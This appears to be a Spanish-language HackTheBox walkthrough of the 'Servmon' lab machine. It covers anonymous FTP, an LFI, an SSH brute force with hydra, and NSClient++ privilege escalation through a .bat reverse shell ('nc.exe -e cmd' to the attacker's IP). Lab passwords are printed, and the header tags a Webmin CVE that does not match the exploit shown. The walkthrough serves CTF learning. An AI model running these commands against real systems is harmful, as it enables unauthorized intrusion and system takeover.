---
title: HackTheBox - Servmon
author: cotes
date: 2023-09-12 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakeage', 'RCE Webmin (CVE-2019-12840)']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Servmon/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Servmon Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **Information Leakeage, RCE Webmin (CVE-2019-12840)**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Servmon/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p21,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Servmon/02-versions.png)

* Puntos principales:
    + [x] Podemos acceder de forma anónima al servicio FTP.
    + [x] Tenemos dos sitios web: **HTTP - 80 | HTTPS - 8443**
    + [x] El servicio SSH se encuentra habilitado

Inspeccionamos el servicio **FTP** en buscar de cualquier información y la descargamos

```bash
❯  ftp 10.10.10.184
Name (10.10.10.184:kali): anonymous
ftp> dir
02-28-22  07:35PM       <DIR>          Users
ftp> cd Users
ftp> dir
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
ftp> cd Nadine
02-28-22  07:36PM                  168 Confidential.txt
ftp> get Confidential.txt
ftp> exit

❯ cat Confidential.txt

Nathan,
I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
Regards
Nadine
```

Aquí nos mencionan que existe un archivo **passwords.txt** en el escritorio del usuario nathan.

c. Al buscar por vulnerabilidades del servicio **HTTP** llegamos a un [LFI](https://www.exploit-db.com/exploits/48311)

![](/assets/images/HTB/Easy/Servmon/03-lfi.png)

Una vez obtenemos el fichero antes mencionado, hacemos fuerza bruta en el servicio **SSH** con hydra a los dos usuarios (nathan y nadine)

```bash
❯ hydra -L users.txt -P passwords.txt ssh://10.10.10.184 -t 4

[22][ssh] host: 10.10.10.184   login: nadine   password: L1k3B1gBut7s@W0rk
```

### Escalada de Privilegios 💹

a. Al enumerar el sistema, encontramos el directorio 'C:\Program Files\NSClient++' y si buscamos vulnerabilidades asociadas, encontramos una para [escalación de privilegios](https://www.exploit-db.com/exploits/46802)

Aquí usan el servicio **https** del puerto `8443`, y para llevar acabo este exploit debemos tener en cuenta múltiples puntos

1. Obtenemos la contraseña actual

    ```bash
    nadine@SERVMON C:\Program Files\NSClient++>.\nscp web -- password --display
    Current password: ew2x6SsGTxjRwXOT
    ```

2. De primeras nos seremos capaces de acceder al servicio **NSClient++** 

    ![](/assets/images/HTB/Easy/Servmon/04-error.png)

    > Para solucionar esto debemos realizar Local Port Forwarding: `sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@<IP Servmon> -L 8443:127.0.0.1:8443`
    {: .prompt-tip }


3. Ahora, debemos descargarnos [nc](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) y creamos un fichero .bat para entablar una reverse shell

    ```bat
    @echo off
    C:\temp\nc.exe -e cmd <tun0 IP> 443
    ```

    * Transferimos estos ficheros al directorio **`C:\temp`**

        ```cmd
        ❯ python -m http.server 80
        -----------------------------------------------------------------
        nadine@SERVMON C:\>mkdir temp
        nadine@SERVMON C:\temp>powershell
        PS C:\temp> wget http://<tun0 IP>/nc.exe -OutFile "./nc.exe"
        PS C:\temp> wget http://<tun0 IP>/test.bat -OutFile "./test.bat"
        ```

4. Nos autenticamos en el servicio NSClient++ y lo configuramos para ejecutar el script **test.bat**

    ![](/assets/images/HTB/Easy/Servmon/05-script.png)

    * Nos ponemos en escucha con **nc**, reiniciamos NSClient++ y luego damos clic en el apartado `Queries`

> En caso de no recibir la reverse shell reiniciamos la **Máquina Servmon**
{: .prompt-warning }

Después de todo este proceso recibimos la reverse shell

```bash
❯ nc -lvnp 443                                                                                            
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.184] 50986
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
nt authority\system
```